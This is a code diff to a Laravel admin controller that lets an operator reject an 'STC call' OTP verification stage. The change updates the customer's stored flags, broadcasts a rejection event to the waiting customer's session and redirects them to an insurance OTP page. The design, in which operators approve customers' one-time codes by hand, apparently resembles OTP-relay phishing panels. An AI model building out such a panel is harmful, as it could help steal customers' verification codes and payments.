@@ -182,11 +182,52 @@ class AdminStcController extends Controller
 
     public function rejectCall(AdminOtpRejectRequest $request): JsonResponse
     {
-        return $this->rejectStage(
-            $request,
-            StcCallRejected::class,
+        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();
+        $customer = $otp->customer;
+        $customerIp = $customer?->ip_address ?? $request->customer_ip;
+        $sessionId = $otp->session_id ?: $customer?->session_id;
+        $extra = $customer?->extra_data ?? [];
+
+        if (! empty($extra['stc_call_approved']) || ! empty($extra['stc_call_rejected'])) {
+            return response()->json([
+                'success' => false,
+                'message' => 'هذا الطلب تم معالجته مسبقاً',
+            ], 422);
+        }
+
+        // Stage 3 reuses the OTP approved in Stage 2. A call rejection must
+        // not overwrite that OTP's approved state, but it may still reject the
+        // call stage and notify the waiting customer.
+        if ($otp->status === 'pending') {
+            $otp->reject($request->input('reason'));
+        } elseif (! in_array($otp->status, ['approved', 'verified'], true)) {
+            return response()->json([
+                'success' => false,
+                'message' => 'هذا الطلب تم معالجته مسبقاً',
+            ], 422);
+        }
+
+        $event = new StcCallRejected($sessionId, $request->input('reason'), $customer?->id);
+
+        try {
+            broadcast($event)->toOthers();
+        } catch (\Throwable $e) {
+            Log::warning('Broadcast failed (stc_call_rejected): ' . $e->getMessage());
+        }
+
+        $this->setStcFlag(
+            $customer,
             'stc_call_rejected',
-            'تم رفض مكالمة التحقق STC',
+            '/insurance/stc/otp',
+            $request->input('reason'),
         );
+        $this->flushCustomerCache();
+        $this->notifyDashboard($customer ?? $customerIp, 'stc_call_rejected');
+        $this->refreshPaymentViewed($customer ?? $customerIp);
+
+        return response()->json([
+            'success' => true,
+            'message' => 'تم رفض مكالمة التحقق STC',
+        ]);
     }
 }
